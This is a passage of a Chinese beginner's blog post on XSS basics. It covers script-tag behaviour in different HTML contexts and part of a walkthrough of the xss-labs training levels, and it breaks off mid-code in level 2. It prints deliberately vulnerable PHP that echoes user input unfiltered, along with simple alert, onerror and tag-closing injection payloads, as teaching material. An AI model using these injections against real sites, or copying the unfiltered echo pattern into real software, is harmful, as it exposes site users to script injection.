href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BE%E7%BD%AE"><span class="nav-text">服务器设置</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZQ-Rookie-Hacker"
      src="/images/zhuzhuxia.jpg">
  <p class="site-author-name" itemprop="name">ZQ-Rookie-Hacker</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">35</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/ZQ-Rookie-Hacker" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ZQ-Rookie-Hacker" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zhuzhuxia.jpg">
      <meta itemprop="name" content="ZQ-Rookie-Hacker">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="XSS漏洞基础 | ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          XSS漏洞基础
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-01-18 12:00:00" itemprop="dateCreated datePublished" datetime="2025-01-18T12:00:00+08:00">2025-01-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-05-18 12:00:00" itemprop="dateModified" datetime="2025-05-18T12:00:00+08:00">2025-05-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web/XSS%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">XSS漏洞</span></a>
        </span>
    </span>

  
    <span id="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" class="post-meta-item leancloud_visitors" data-flag-title="XSS漏洞基础" title="阅读次数">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span class="leancloud-visitors-count"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>37 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本人是个网安菜鸡，这是写的第一篇有关XSS漏洞学习的博客，请多多指教。</p>
<p>1.由于不可以在非代码区书写完整的html标签 用   [ ]  代替 &lt;  &gt;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sript</span>&gt;</span>   --&gt;   [script]  </span><br></pre></td></tr></table></figure>
<p>2.作者用的是chrome浏览器，不同的浏览器回显的网页代码颜色或是容错规则方面有差异</p>
<hr>
<h1 id="一、xss漏洞是什么？"><a href="#一、xss漏洞是什么？" class="headerlink" title="一、xss漏洞是什么？"></a>一、xss漏洞是什么？</h1><p>XSS（跨站脚本攻击，Cross-Site Scripting）是一种常见的Web安全漏洞，攻击者通过向网页中注入恶意脚本代码，当其他用户访问该页面时，这些脚本会在其浏览器中执行，从而导致数据泄露、会话劫持、钓鱼攻击等安全问题</p>
<hr>
<h1 id="二、xss漏洞的基本知识"><a href="#二、xss漏洞的基本知识" class="headerlink" title="二、xss漏洞的基本知识"></a>二、xss漏洞的基本知识</h1><h2 id="1-HTML-中的「文本标签」"><a href="#1-HTML-中的「文本标签」" class="headerlink" title="1.HTML 中的「文本标签」"></a>1.HTML 中的「文本标签」</h2><blockquote>
<p>通常指用于包裹文本内容的标签，例如：<br>段落标签：p、h1-h6<br>行内容器：span、em、strong<br>列表项：li<br>其他文本容器：div、section（虽然通用，但常用于包裹文本块）</p>
</blockquote>
<hr>
<h2 id="2-script-嵌套在不同标签下的脚本运行情况"><a href="#2-script-嵌套在不同标签下的脚本运行情况" class="headerlink" title="2.script 嵌套在不同标签下的脚本运行情况"></a>2.script 嵌套在不同标签下的脚本运行情况</h2><h3 id="脚本执行的核心规则"><a href="#脚本执行的核心规则" class="headerlink" title="*脚本执行的核心规则"></a>*脚本执行的核心规则</h3><ul>
<li>浏览器纠错机制<br>HTML 解析器会尝试修复非法嵌套，将 script 移到允许的位置（如父容器外部），确保脚本执行。</li>
<li>内容模型（Content Model）限制<br>每个 HTML 标签有允许嵌套的内容类型（如流内容、短语内容等），非法嵌套可能导致 DOM 结构变化。</li>
<li>安全策略影响<br>如 CSP（内容安全策略）会阻止未授权的内联脚本或外部资源。</li>
</ul>
<h3 id="补充知识"><a href="#补充知识" class="headerlink" title="*补充知识"></a>*补充知识</h3><blockquote>
<p>1.浏览器在解析javascript的属性值时，是支持十进制或是十六进制的unicode编码<br>2.URL编码，也叫百分号编码，是用来将特殊字符转换成可以在URL中安全使用的格式，通常用%加上两位的十六进制数来表示<br>3. alert(“ “)  alert(‘ ‘)   双引号与单引号均可以<br> 4. console.log(‘ ‘)    &#x2F;(“ “)    控制台输出<br>5.url编码的字符-&gt;搜索<br>6.多个键值对的输入用&amp;分割<br>7.align（对齐）属性或相关标签（比如 [div align&#x3D;”center”]），这在早期的 HTML 中用于对齐内容，但现代开发中已不推荐使用，建议改用 CSS 实现对齐。<br>8.前后符号最好都闭合，防止浏览器非预期‘容错’，也可以活动注释符号<br>9.src，href<br>10.gfi文件格式</p>
</blockquote>
<p>在 XSS 攻击或前端开发中，<code>&lt;script&gt;</code> 标签的<strong>嵌套位置</strong>和<strong>上下文环境</strong>会直接影响脚本的执行行为。以下是不同场景下的详细分析：</p>
<hr>
<p>在 XSS 攻击或前端开发中，<code>&lt;script&gt;</code> 标签的<strong>嵌套位置</strong>和<strong>上下文环境</strong>会直接影响脚本的执行行为。以下是不同场景下的详细分析：</p>
<hr>
<h3 id="1-标签的标准位置"><a href="#1-标签的标准位置" class="headerlink" title="1. &lt;script&gt; 标签的标准位置"></a>1. <code>&lt;script&gt;</code> 标签的标准位置</h3><p>HTML 规范允许 <code>&lt;script&gt;</code> 标签出现在 <strong><code>&lt;head&gt;</code></strong> 或 <strong><code>&lt;body&gt;</code></strong> 中，但行为略有差异：</p>
<ul>
<li><strong>在 <code>&lt;head&gt;</code> 中</strong>：<ul>
<li>脚本默认<strong>同步加载和执行</strong>，会阻塞 HTML 解析。</li>
<li>适合初始化代码或依赖库（如 jQuery）。</li>
</ul>
</li>
<li><strong>在 <code>&lt;body&gt;</code> 末尾</strong>：<ul>
<li>延迟加载，避免阻塞页面渲染。</li>
<li>适合操作 DOM 的代码（需确保 DOM 已加载）。</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Head 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Body 末尾的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-嵌套在其他标签内"><a href="#2-嵌套在其他标签内" class="headerlink" title="2. &lt;script&gt; 嵌套在其他标签内"></a>2. <code>&lt;script&gt;</code> 嵌套在其他标签内</h3><h4 id="场景-1：普通容器标签（如-、）"><a href="#场景-1：普通容器标签（如-、）" class="headerlink" title="场景 1：普通容器标签（如 &lt;div&gt;、&lt;span&gt;）"></a>场景 1：普通容器标签（如 <code>&lt;div&gt;</code>、<code>&lt;span&gt;</code>）</h4><ul>
<li><strong>脚本仍会执行</strong>，但需注意<strong>执行时机</strong>：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;嵌套在 div 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>当 HTML 解析到此处时立即执行。</li>
<li>如果容器标签被动态插入（如通过 JS），脚本会在插入时执行。</li>
</ul>
</li>
</ul>
<h4 id="场景-2：表单标签（如-）"><a href="#场景-2：表单标签（如-）" class="headerlink" title="场景 2：表单标签（如 &lt;form&gt;）"></a>场景 2：表单标签（如 <code>&lt;form&gt;</code>）</h4><ul>
<li>脚本正常执行，但可能破坏表单结构：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;表单内的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-3：表格标签（如-、）"><a href="#场景-3：表格标签（如-、）" class="headerlink" title="场景 3：表格标签（如 &lt;table&gt;、&lt;tr&gt;）"></a>场景 3：表格标签（如 <code>&lt;table&gt;</code>、<code>&lt;tr&gt;</code>）</h4><ul>
<li>部分浏览器可能因 HTML 解析规则拒绝执行：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;表格内的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 可能不执行 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>应避免将 <code>&lt;script&gt;</code> 直接放在 <code>&lt;table&gt;</code> 或 <code>&lt;tr&gt;</code> 内。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-在特殊标签中的行为"><a href="#3-在特殊标签中的行为" class="headerlink" title="3. &lt;script&gt; 在特殊标签中的行为"></a>3. <code>&lt;script&gt;</code> 在特殊标签中的行为</h3><h4 id="场景-1：-标签"><a href="#场景-1：-标签" class="headerlink" title="场景 1：&lt;noscript&gt; 标签"></a>场景 1：<code>&lt;noscript&gt;</code> 标签</h4><ul>
<li>仅当浏览器<strong>禁用 JavaScript</strong> 时，<code>&lt;noscript&gt;</code> 内的内容会显示：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;不会执行&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>请启用 JavaScript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>内部的 <code>&lt;script&gt;</code> <strong>永远不会执行</strong>。</li>
</ul>
</li>
</ul>
<h4 id="场景-2：-标签"><a href="#场景-2：-标签" class="headerlink" title="场景 2：&lt;template&gt; 标签"></a>场景 2：<code>&lt;template&gt;</code> 标签</h4><ul>
<li><code>&lt;template&gt;</code> 内的内容被视为<strong>惰性文档片段</strong>，脚本不会执行：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;模板中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>只有当内容被克隆并插入 DOM 后，脚本才会执行。</li>
</ul>
</li>
</ul>
<h4 id="场景-3：SVG-或-MathML-标签"><a href="#场景-3：SVG-或-MathML-标签" class="headerlink" title="场景 3：SVG 或 MathML 标签"></a>场景 3：SVG 或 MathML 标签</h4><ul>
<li>在 SVG&#x2F;MathML 中嵌入 <code>&lt;script&gt;</code>，行为与 HTML 一致：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;SVG 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="4-动态插入的"><a href="#4-动态插入的" class="headerlink" title="4. 动态插入的 &lt;script&gt;"></a>4. 动态插入的 <code>&lt;script&gt;</code></h3><p>通过 JavaScript 动态创建的 <code>&lt;script&gt;</code> 标签，行为受插入位置影响：</p>
<h4 id="插入到-或-中："><a href="#插入到-或-中：" class="headerlink" title="插入到 &lt;head&gt; 或 &lt;body&gt; 中："></a>插入到 <code>&lt;head&gt;</code> 或 <code>&lt;body&gt;</code> 中：</h4><ul>
<li>脚本异步加载，默认不阻塞页面：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;file.js&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script); <span class="comment">// 或 document.body</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="插入到其他容器中（如-）："><a href="#插入到其他容器中（如-）：" class="headerlink" title="插入到其他容器中（如 &lt;div&gt;）："></a>插入到其他容器中（如 <code>&lt;div&gt;</code>）：</h4><ul>
<li>脚本仍会执行，但可能因容器未渲染而无法操作其内部 DOM：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;script&gt;console.log(&quot;动态脚本&quot;);&lt;\/script&gt;&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="5-XSS-攻击中的-嵌套利用"><a href="#5-XSS-攻击中的-嵌套利用" class="headerlink" title="5. XSS 攻击中的 &lt;script&gt; 嵌套利用"></a>5. XSS 攻击中的 <code>&lt;script&gt;</code> 嵌套利用</h3><p>攻击者可能尝试在非标准位置注入脚本以绕过过滤：</p>
<h4 id="场景-1：属性内的脚本"><a href="#场景-1：属性内的脚本" class="headerlink" title="场景 1：属性内的脚本"></a>场景 1：属性内的脚本</h4><ul>
<li>利用事件属性执行代码（无需 <code>&lt;script&gt;</code> 标签）：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span> <span class="comment">&lt;!-- 通过事件触发 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-2：闭合标签注入"><a href="#场景-2：闭合标签注入" class="headerlink" title="场景 2：闭合标签注入"></a>场景 2：闭合标签注入</h4><ul>
<li>通过闭合父标签提前结束上下文，插入 <code>&lt;script&gt;</code>：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 闭合原有标签 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-3：利用-HTML-解析特性"><a href="#场景-3：利用-HTML-解析特性" class="headerlink" title="场景 3：利用 HTML 解析特性"></a>场景 3：利用 HTML 解析特性</h4><ul>
<li>某些上下文允许省略闭合标签或特殊字符：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 实际不会执行，因为 &lt;script&gt; 被当作文本内容 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h1 id="三、xss-labs解题思路-源码分析"><a href="#三、xss-labs解题思路-源码分析" class="headerlink" title="三、xss-labs解题思路+源码分析"></a>三、xss-labs解题思路+源码分析</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>类型：url类性</p>
<p>解题思路：<br>1.第一个没有任何的输入框，点解图片也没有任何变化<br>2.突破口-&gt;网址栏-&gt;随便输入几次数据观察网页情况<br>3.查看网页源码-&gt;变化化处的标签</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_1.png" class="" title="在这里插入图片描述">

<p>外层标签是h1 文本便签，嵌入script标签的脚本可以发挥作用<br>因此，只需要属于一段完整的脚本即可</p>
<p> 源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="line"> <span class="comment">//window 在加载完所有元素后，才会执行这个语句  href=&quot;跳转链接&quot;；</span></span><br><span class="line"> <span class="comment">//在level1这一关的网页控制台输入 window.location.href=&quot;level2.php?keyword=test&quot;; 就会跳转至第二关</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];   <span class="comment">//没有进行任何过滤，直接将内容赋值给变量$str</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于没有任何过滤，只需输入简单的js代码就可以通过,例如：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;GGBOND&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;GGBOND&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line"></span><br><span class="line">注意：1.不要忘记写上分号 2.探测时最好用字符串探测（可以获取网页回显的信息-&gt;判断是什么类型的防护）</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>类型：输入框类型</p>
<p>解题思路：<br>1.有输入框–&gt;value-&gt;字符逃逸<br>2.输入测试语句-&gt;查看变化处的源码(重点关注value)</p>
<p>测试语句</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alter</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_2.png" class="" title="在这里插入图片描述">
<ul>
<li><p>1.输入的语句没有缺失或者是改变</p>
</li>
<li><p>2.未输入语句时 value&#x3D;” “ ,输入后 有一部分橙色，一部分蓝色 ，一般来说，网页源代码橙色是值，蓝色是标签。</p>
</li>
</ul>
<p>出现这种情况是因为没有闭合，导致标签混乱</p>
<p>解决方法：闭合value</p>
<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="*字符逃逸"></a>*字符逃逸</h3><p>1.仅仅输入 “ ：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_3.png" class="" title="在这里插入图片描述">
<p>闭合了前引号</p>
<p>2.输入 “&gt;</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_4.png" class="" title="在这里插入图片描述">
<p>“ &gt;  逃逸出input标签，下图为此时的页面渲染</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_5.png" class="" title="在这里插入图片描述">

<p>所以只需在之后加上相应的语句即可通关</p>
<p>3.除了逃逸，还可以构造为input的属性 </p>
<p>具体语句在下方源码分析</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span 